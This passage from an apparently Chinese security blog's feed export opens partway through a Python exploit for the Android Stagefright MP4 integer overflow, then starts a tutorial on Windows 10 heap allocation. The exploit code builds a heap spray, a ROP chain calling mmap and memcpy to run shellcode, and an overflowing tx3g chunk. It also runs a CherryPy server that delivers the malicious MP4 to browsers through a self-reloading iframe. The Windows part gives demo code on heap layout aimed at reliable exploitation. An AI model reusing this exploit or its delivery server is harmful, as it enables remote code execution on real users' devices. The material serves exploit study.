class="string">"&lt;I"</span>, val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p64</span><span class="params">(val)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> struct.pack(<span class="string">"&lt;Q"</span>, val)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunk</span><span class="params">(tag, data, length=<span class="number">0</span>)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line">    length = len(data) + <span class="number">8</span></span><br><span class="line">  <span class="keyword">if</span> length &gt; <span class="number">0xffffffff</span>:</span><br><span class="line">    <span class="keyword">return</span> pb32(<span class="number">1</span>) + tag + pb64(length)+ data</span><br><span class="line">  <span class="keyword">return</span> pb32(length) + tag + data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc_avcc</span><span class="params">(size)</span>:</span></span><br><span class="line">  avcc = <span class="string">'A'</span> * size</span><br><span class="line">  <span class="keyword">return</span> chunk(<span class="string">'avcC'</span>, avcc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc_hvcc</span><span class="params">(size)</span>:</span></span><br><span class="line">  hvcc = <span class="string">'H'</span> * size</span><br><span class="line">  <span class="keyword">return</span> chunk(<span class="string">'hvcC'</span>, hvcc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sample_table</span><span class="params">(data)</span>:</span></span><br><span class="line">  stbl = <span class="string">''</span></span><br><span class="line">  stbl += chunk(<span class="string">'stco'</span>, <span class="string">'\x00'</span> * <span class="number">8</span>)</span><br><span class="line">  stbl += chunk(<span class="string">'stsc'</span>, <span class="string">'\x00'</span> * <span class="number">8</span>)</span><br><span class="line">  stbl += chunk(<span class="string">'stsz'</span>, <span class="string">'\x00'</span> * <span class="number">12</span>)</span><br><span class="line">  stbl += chunk(<span class="string">'stts'</span>, <span class="string">'\x00'</span> * <span class="number">8</span>)</span><br><span class="line">  stbl += data</span><br><span class="line">  <span class="keyword">return</span> chunk(<span class="string">'stbl'</span>, stbl)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">memory_leak</span><span class="params">(size)</span>:</span></span><br><span class="line">  pssh = <span class="string">'leak'</span></span><br><span class="line">  pssh += <span class="string">'L'</span> * <span class="number">16</span></span><br><span class="line">  pssh += pb32(size)</span><br><span class="line">  pssh += <span class="string">'L'</span> * size</span><br><span class="line">  <span class="keyword">return</span> chunk(<span class="string">'pssh'</span>, pssh)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heap_spray</span><span class="params">(size)</span>:</span></span><br><span class="line">  pssh = <span class="string">'spry'</span></span><br><span class="line">  pssh += <span class="string">'S'</span> * <span class="number">16</span></span><br><span class="line">  pssh += pb32(size)</span><br><span class="line"></span><br><span class="line">  page = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  nop = asm.asm(<span class="string">'nop'</span>, arch=<span class="string">'thumb'</span>)</span><br><span class="line">  <span class="keyword">while</span> len(page) &lt; <span class="number">0x100</span>:</span><br><span class="line">    page += nop</span><br><span class="line">  page += shellcode</span><br><span class="line">  <span class="keyword">while</span> len(page) &lt; <span class="number">0xed0</span>:</span><br><span class="line">    page += <span class="string">'\xcc'</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># MPEG4DataSource fake vtable</span></span><br><span class="line">  page += p32(stack_pivot)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># pivot swaps stack then returns to pop &#123;pc&#125;</span></span><br><span class="line">  page += p32(pop_r0_r1_r2_r3_pc)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># mmap64(mmap_address,</span></span><br><span class="line">  <span class="comment">#        0x1000,</span></span><br><span class="line">  <span class="comment">#        PROT_READ | PROT_WRITE | PROT_EXECUTE,</span></span><br><span class="line">  <span class="comment">#        MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS,</span></span><br><span class="line">  <span class="comment">#        -1,</span></span><br><span class="line">  <span class="comment">#        0);</span></span><br><span class="line"></span><br><span class="line">  page += p32(mmap_address)             <span class="comment"># r0 = address</span></span><br><span class="line">  page += p32(<span class="number">0x1000</span>)                   <span class="comment"># r1 = size</span></span><br><span class="line">  page += p32(<span class="number">7</span>)                        <span class="comment"># r2 = protection</span></span><br><span class="line">  page += p32(<span class="number">0x32</span>)                     <span class="comment"># r3 = flags</span></span><br><span class="line">  page += p32(ldr_lr_bx_lr)             <span class="comment"># pc</span></span><br><span class="line"></span><br><span class="line">  page += pad(ldr_lr_bx_lr_stack_pad)</span><br><span class="line">  page += p32(pop_r4_r5_r6_r7_pc)       <span class="comment"># lr</span></span><br><span class="line">  page += pad(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">  page += p32(<span class="number">0x44444444</span>)               <span class="comment"># r4</span></span><br><span class="line">  page += p32(<span class="number">0x55555555</span>)               <span class="comment"># r5</span></span><br><span class="line">  page += p32(<span class="number">0x66666666</span>)               <span class="comment"># r6</span></span><br><span class="line">  page += p32(<span class="number">0x77777777</span>)               <span class="comment"># r7</span></span><br><span class="line">  page += p32(mmap64)                   <span class="comment"># pc</span></span><br><span class="line"></span><br><span class="line">  page += p32(<span class="number">0xffffffff</span>)               <span class="comment"># fd      (and then r4)</span></span><br><span class="line">  page += pad(<span class="number">4</span>)                        <span class="comment"># padding (and then r5)</span></span><br><span class="line">  page += p64(<span class="number">0</span>)                        <span class="comment"># offset  (and then r6, r7)</span></span><br><span class="line">  page += p32(pop_r0_r1_r2_r3_pc)       <span class="comment"># pc</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># memcpy(shellcode_address,</span></span><br><span class="line">  <span class="comment">#        spray_address + len(rop_stack),</span></span><br><span class="line">  <span class="comment">#        len(shellcode));</span></span><br><span class="line"></span><br><span class="line">  page += p32(mmap_address)             <span class="comment"># r0 = dst</span></span><br><span class="line">  page += p32(spray_address - <span class="number">0xed0</span>)    <span class="comment"># r1 = src</span></span><br><span class="line">  page += p32(<span class="number">0xed0</span>)                    <span class="comment"># r2 = size</span></span><br><span class="line">  page += p32(<span class="number">0x33333333</span>)               <span class="comment"># r3</span></span><br><span class="line">  page += p32(ldr_lr_bx_lr)             <span class="comment"># pc</span></span><br><span class="line"></span><br><span class="line">  page += pad(ldr_lr_bx_lr_stack_pad)</span><br><span class="line">  page += p32(pop_r4_r5_r6_r7_pc)       <span class="comment"># lr</span></span><br><span class="line">  page += pad(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">  page += p32(<span class="number">0x44444444</span>)               <span class="comment"># r4</span></span><br><span class="line">  page += p32(<span class="number">0x55555555</span>)               <span class="comment"># r5</span></span><br><span class="line">  page += p32(<span class="number">0x66666666</span>)               <span class="comment"># r6</span></span><br><span class="line">  page += p32(<span class="number">0x77777777</span>)               <span class="comment"># r7</span></span><br><span class="line">  page += p32(memcpy)                   <span class="comment"># pc</span></span><br><span class="line"></span><br><span class="line">  page += p32(<span class="number">0x44444444</span>)               <span class="comment"># r4</span></span><br><span class="line">  page += p32(<span class="number">0x55555555</span>)               <span class="comment"># r5</span></span><br><span class="line">  page += p32(<span class="number">0x66666666</span>)               <span class="comment"># r6</span></span><br><span class="line">  page += p32(<span class="number">0x77777777</span>)               <span class="comment"># r7</span></span><br><span class="line">  page += p32(mmap_address + <span class="number">1</span>)         <span class="comment"># pc</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> len(page) &lt; <span class="number">0x1000</span>:</span><br><span class="line">    page += <span class="string">'#'</span></span><br><span class="line"></span><br><span class="line">  pssh += page * (size // <span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> chunk(<span class="string">'pssh'</span>, pssh)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit_mp4</span><span class="params">()</span>:</span></span><br><span class="line">  ftyp = chunk(<span class="string">"ftyp"</span>,<span class="string">"69736f6d0000000169736f6d"</span>.decode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line">  trak = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># heap spray so we have somewhere to land our corrupted vtable</span></span><br><span class="line">  <span class="comment"># pointer</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># yes, we wrap this in a sample_table for a reason; the</span></span><br><span class="line">  <span class="comment"># NuCachedSource we will be using otherwise triggers calls to mmap,</span></span><br><span class="line">  <span class="comment"># leaving our large allocations non-contiguous and making our chance</span></span><br><span class="line">  <span class="comment"># of failure pretty high. wrapping in a sample_table means that we</span></span><br><span class="line">  <span class="comment"># wrap the NuCachedSource with an MPEG4Source, making a single</span></span><br><span class="line">  <span class="comment"># allocation that caches all the data, doubling our heap spray</span></span><br><span class="line">  <span class="comment"># effectiveness :-)</span></span><br><span class="line">  trak += sample_table(heap_spray(spray_size) * spray_count)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># heap groom for our MPEG4DataSource corruption</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># get the default size allocations for our MetaData::typed_data</span></span><br><span class="line">  <span class="comment"># groom allocations out of the way first, by allocating small blocks</span></span><br><span class="line">  <span class="comment"># instead.</span></span><br><span class="line">  trak += alloc_avcc(<span class="number">8</span>)</span><br><span class="line">  trak += alloc_hvcc(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># we allocate the initial tx3g chunk here; we'll use the integer</span></span><br><span class="line">  <span class="comment"># overflow so that the allocated buffer later is smaller than the</span></span><br><span class="line">  <span class="comment"># original size of this chunk, then overflow all of the following</span></span><br><span class="line">  <span class="comment"># MPEG4DataSource object and the following pssh allocation; hence why</span></span><br><span class="line">  <span class="comment"># we will need the extra groom allocation (so we don't overwrite</span></span><br><span class="line">  <span class="comment"># anything sensitive...)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | tx3g | MPEG4DataSource | pssh |</span></span><br><span class="line">  overflow = <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | tx3g ----------------&gt; | pssh |</span></span><br><span class="line">  overflow += p32(spray_address)         <span class="comment"># MPEG4DataSource vtable ptr</span></span><br><span class="line">  overflow += <span class="string">'0'</span> * <span class="number">0x48</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r4</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r5</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r6</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r7</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r8</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r9</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r10</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r11</span></span><br><span class="line">  overflow += <span class="string">'0000'</span>                    <span class="comment"># r12</span></span><br><span class="line">  overflow += p32(spray_address + <span class="number">0x20</span>) <span class="comment"># sp</span></span><br><span class="line">  overflow += p32(pop_pc)               <span class="comment"># lr</span></span><br><span class="line"></span><br><span class="line">  trak += chunk(<span class="string">"tx3g"</span>, overflow)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># defragment the for alloc_size blocks, then make our two</span></span><br><span class="line">  <span class="comment"># allocations. we end up with a spurious block in the middle, from</span></span><br><span class="line">  <span class="comment"># the temporary ABuffer deallocation.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh |</span></span><br><span class="line">  trak += memory_leak(alloc_size) * groom_count</span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | .... | avcC |</span></span><br><span class="line">  trak += alloc_avcc(alloc_size)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | .... | avcC | hvcC |</span></span><br><span class="line">  trak += alloc_hvcc(alloc_size)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | pssh | avcC | hvcC | pssh |</span></span><br><span class="line">  trak += memory_leak(alloc_size) * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | pssh | avcC | .... |</span></span><br><span class="line">  trak += alloc_hvcc(alloc_size * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># entering the stbl chunk triggers allocation of an MPEG4DataSource</span></span><br><span class="line">  <span class="comment"># object</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | pssh | avcC | MPEG4DataSource | pssh |</span></span><br><span class="line">  stbl = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | pssh | .... | MPEG4DataSource | pssh |</span></span><br><span class="line">  stbl += alloc_avcc(alloc_size * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | pssh | tx3g | MPEG4DataSource | pssh |</span></span><br><span class="line">  <span class="comment"># | pssh | - | pssh | pssh | tx3g ----------------&gt; |</span></span><br><span class="line">  overflow_length = (-(len(overflow) - <span class="number">24</span>) &amp; <span class="number">0xffffffffffffffff</span>)</span><br><span class="line">  stbl += chunk(<span class="string">"tx3g"</span>, <span class="string">''</span>, length = overflow_length)</span><br><span class="line"></span><br><span class="line">  trak += chunk(<span class="string">'stbl'</span>, stbl)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ftyp + chunk(<span class="string">'trak'</span>, trak)</span><br><span class="line"></span><br><span class="line">index_page = <span class="string">'''</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Stagefrightened!&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">    window.setTimeout('location.reload(true);', 4000);</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;iframe src='/exploit.mp4'&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExploitServer</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">  exploit_file = <span class="literal">None</span></span><br><span class="line">  exploit_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  @cherrypy.expose</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.exploit_count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'*'</span> * <span class="number">80</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'exploit attempt: '</span> + str(self.exploit_count)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'*'</span> * <span class="number">80</span></span><br><span class="line">    <span class="keyword">return</span> index_page</span><br><span class="line"></span><br><span class="line"><span class="meta">  @cherrypy.expose(["exploit.mp4"])</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self)</span>:</span></span><br><span class="line">    cherrypy.response.headers[<span class="string">'Content-Type'</span>] = <span class="string">'video/mp4'</span></span><br><span class="line">    cherrypy.response.headers[<span class="string">'Content-Encoding'</span>] = <span class="string">'gzip'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.exploit_file <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">      exploit_uncompressed = exploit_mp4()</span><br><span class="line">      <span class="keyword">with</span> open(<span class="string">'exploit_uncompressed.mp4'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> tmp:</span><br><span class="line">        tmp.write(exploit_uncompressed)</span><br><span class="line">      os.system(<span class="string">'gzip exploit_uncompressed.mp4'</span>)</span><br><span class="line">      <span class="keyword">with</span> open(<span class="string">'exploit_uncompressed.mp4.gz'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> tmp:</span><br><span class="line">        self.exploit_file = tmp.read()</span><br><span class="line">      os.system(<span class="string">'rm exploit_uncompressed.mp4.gz'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> self.exploit_file</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  find_rop_gadgets(<span class="string">'libc.so'</span>)</span><br><span class="line">  <span class="keyword">with</span> open(<span class="string">'exploit.mp4'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> tmp:</span><br><span class="line">    tmp.write(exploit_mp4())</span><br><span class="line">  cherrypy.quickstart(ExploitServer())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这是Android lib中一个比较简单的整数溢出漏洞，利用前前后后读读源码就行了，可是我就好奇这是怎么挖出来的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前一阵看了一阵二进制漏洞的利用，其实挺迷惑方向的，CTF pwn是一种玩法，然后其它还有浏览器、虚拟机逃逸、Office全家桶、Adobe全家桶、kernel等等，还有什么物联网，选恐的我当时就慌了，每个方向（除物联网，我不会）看了几个洞以后，学到了一些二进制利用的套路，也
      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Windows10堆分配及利用从入门到入门</title>
    <link href="https://github.com/Cracke-S-J/2020/05/22/Windows10%E5%A0%86%E5%88%86%E9%85%8D%E5%8F%8A%E5%88%A9%E7%94%A8%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A8/"/>
    <id>https://github.com/Cracke-S-J/2020/05/22/Windows10%E5%A0%86%E5%88%86%E9%85%8D%E5%8F%8A%E5%88%A9%E7%94%A8%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A8/</id>
    <published>2020-05-22T06:11:00.000Z</published>
    <updated>2020-07-04T04:37:08.549Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Win10堆分配背景知识"><a href="#Win10堆分配背景知识" class="headerlink" title="Win10堆分配背景知识"></a>Win10堆分配背景知识</h2><p>Windows不像Linux，有开源代码可以读，微软至今都没有完全公布</p><h3 id="前端和后端分配器"><a href="#前端和后端分配器" class="headerlink" title="前端和后端分配器"></a>前端和后端分配器</h3><p>前端分配器(Front End Allocator)是后端分配器(Back End Allocator)的一种抽象优化层。不同的使用案例会涉及到不同类型的前端分配器。</p><p>前端分配器有两种：</p><ul><li>旁视列表（Look aside list, LAL）</li><li>低碎片堆（Low fragmentation heap，LFH）</li></ul><p>LAL是一个由128个链表组成的表，每个列表含有特定大小的空闲块，其始于16字节。存在是意义主要是优化加速。</p><p>LFH比较复杂，主要是一种允许系统以某些预定大小分配内存的方法。这意味着当应用程序请求分配时，系统返回适合的最小可用块。</p><p>如果前端分配器不能满足分配的请求，则请求会被发送到后端分配器。</p><p>后端分配器实际上是默认选择，并且至少需要18次分配才能启用LFH。而且，这些分配不必是连续的，它们只需要具有相同的大小。</p><p>看一段demo验证：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE 0x300</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> args, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    LPVOID chunk;</span><br><span class="line">    LPVOID last_chunk;</span><br><span class="line">    HANDLE defaultHeap = GetProcessHeap();</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123;</span><br><span class="line">        chunk = HeapAlloc(defaultHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%2d] Chunk is at 0x%08x.  "</span>, i, chunk);</span><br><span class="line">        <span class="keyword">if</span> (i) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%-6d from the previous address\n"</span>,</span><br><span class="line">                (<span class="keyword">long</span> <span class="keyword">long</span>)chunk - (<span class="keyword">long</span> <span class="keyword">long</span>)last_chunk);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        last_chunk = chunk;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[ 0] Chunk is at 0x00765cb0.</span><br><span class="line">[ 1] Chunk is at 0x00768860.  11184  from the previous address</span><br><span class="line">[ 2] Chunk is at 0x00768b70.  784    from the previous address</span><br><span class="line">[ 3] Chunk is at 0x00765fc0.  -11184 from the previous address</span><br><span class="line">[ 4] Chunk is at 0x007662d0.  784    from the previous address</span><br><span class="line">[ 5] Chunk is at 0x007665e0.  784    from the previous address</span><br><span class="line">[ 6] Chunk is at 0x007668f0.  784    from the previous address</span><br><span class="line">[ 7] Chunk is at 0x00766c00.  784    from the previous address</span><br><span class="line">[ 8] Chunk is at 0x0076ae30.  16944  from the previous address</span><br><span class="line">[ 9] Chunk is at 0x0076b140.  784    from the previous address</span><br><span class="line">[10] Chunk is at 0x0076b450.  784    from the previous address</span><br><span class="line">[11] Chunk is at 0x0076b760.  784    from the previous address</span><br><span class="line">[12] Chunk is at 0x0076ba70.  784    from the previous address</span><br><span class="line">[13] Chunk is at 0x0076bd80.  784    from the previous address</span><br><span class="line">[14] Chunk is at 0x0076c090.  784    from the previous address</span><br><span class="line">[15] Chunk is at 0x0076c3a0.  784    from the previous address</span><br><span class="line">[16] Chunk is at 0x0076c6b0.  784    from the previous address</span><br><span class="line">[17] Chunk is at 0x0076d650.  4000   from the previous address</span><br><span class="line">[18] Chunk is at 0x0076ca10.  -3136  from the previous address</span><br><span class="line">[19] Chunk is at 0x0076e5a0.  7056   from the previous address</span><br><span class="line">[20] Chunk is at 0x0076d340.  -4704  from the previous address</span><br><span class="line">[21] Chunk is at 0x0076cd20.  -1568  from the previous address</span><br><span class="line">[22] Chunk is at 0x0076d960.  3136   from the previous address</span><br><span class="line">[23] Chunk is at 0x0076d030.  -2352  from the previous address</span><br><span class="line">[24] Chunk is at 0x0076dc70.  3136   from the previous address</span><br></pre></td></tr></table></figure><p>从执行结果可以看到，前18块内存基本是连续的，后7块就乱了起来，证明后7块启用了LFH，我们要想稳定利用的话，就要尽量用后端分配器分配，避免用到LFH，因为用到LFH显然，free的块很难紧接着被再分配到了。</p><h3 id="那我应该怎么稳定利用"><a href="#那我应该怎么稳定利用" class="headerlink" title="那我应该怎么稳定利用"></a>那我应该怎么稳定利用</h3><p>写个demo试一下，直接分配能分配到吗：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNK_SIZE 0x300</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> args, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    LPVOID chunk;</span><br><span class="line">    HANDLE defaultHeap = GetProcessHeap();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Trigger LFH</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++) &#123;</span><br><span class="line">        HeapAlloc(defaultHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chunk = HeapAlloc(defaultHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"New chunk in LFH : 0x%08x\n"</span>, chunk);</span><br><span class="line"></span><br><span class="line">    BOOL result = HeapFree(defaultHeap, HEAP_NO_SERIALIZE, chunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"HeapFree returns %d\n"</span>, result);</span><br><span class="line"></span><br><span class="line">    chunk = HeapAlloc(defaultHeap, <span class="number">0</span>, CHUNK_SIZE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Another new chunk : 0x%08x\n"</span>, chunk);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">λ  .\a.exe</span><br><span class="line">New chunk <span class="keyword">in</span> LFH : 0x006fb170</span><br><span class="line">HeapFree returns 1</span><br><span class="line">Another new chunk : 0x006fb170</span><br><span class="line">----------------------------------------------</span><br><span class="line">λ  .\a.exe</span><br><span class="line">New chunk <span class="keyword">in</span> LFH : 0x0072c250</span><br><span class="line">HeapFree returns 1</span><br><span class="line">Another new chunk : 0x0072bf40</span><br><span class="line">----------------------------------------------</span><br><span class="line">λ  .\a.exe</span><br><span class="line">New chunk <span class="keyword">in</span> LFH : 0x0077da50</span><br><span class="line">HeapFree returns 1</span><br><span class="line">Another new chunk : 0x0077d740</span><br><span class="line">----------------------------------------------</span><br><span class="line">λ  .\a.exe</span><br><span class="line">New chunk <span class="keyword">in</span> LFH : 0x0074b170</span><br><span class="line">HeapFree returns 1</span><br><span class="line">Another new chunk : 0x0074b480</span><br><span class="line">----------------------------------------------</span><br></pre></td></tr></table></figure><p>可以看到第一次我人品暴发，分配成功了，后续再都没有成功。</p><h2 id="操练起来"><a href="#操练起来" class="headerlink" title="操练起来"></a>操练起来</h2><h3 id="由上述知识，先写一个泄露地址的demo"><a href="#由上述知识，先写一个泄露地址的demo" class="headerlink" 